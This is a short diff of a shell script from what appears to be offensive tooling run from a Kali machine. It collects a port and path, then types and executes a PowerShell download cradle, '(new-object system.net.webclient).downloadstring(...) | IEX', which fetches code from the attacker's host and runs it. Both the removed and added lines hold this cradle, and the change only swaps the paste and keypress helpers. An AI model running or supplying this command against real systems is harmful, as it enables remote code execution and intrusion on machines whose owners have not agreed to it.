@@ -14,5 +14,5 @@ generate_form "${PORT_FIELD}" "${PATH_FIELD}"
 PORT=${form_data["port"]}
 PATH=${form_data["path"]}
 
-paste_command "(new-object system.net.webclient).downloadstring('http://${KALI_IP}:${PORT}/${PATH}') | IEX; "
-xdotool key Return
+execute_command "(new-object system.net.webclient).downloadstring('http://${KALI_IP}:${PORT}/${PATH}') | IEX; "
+create_new_line
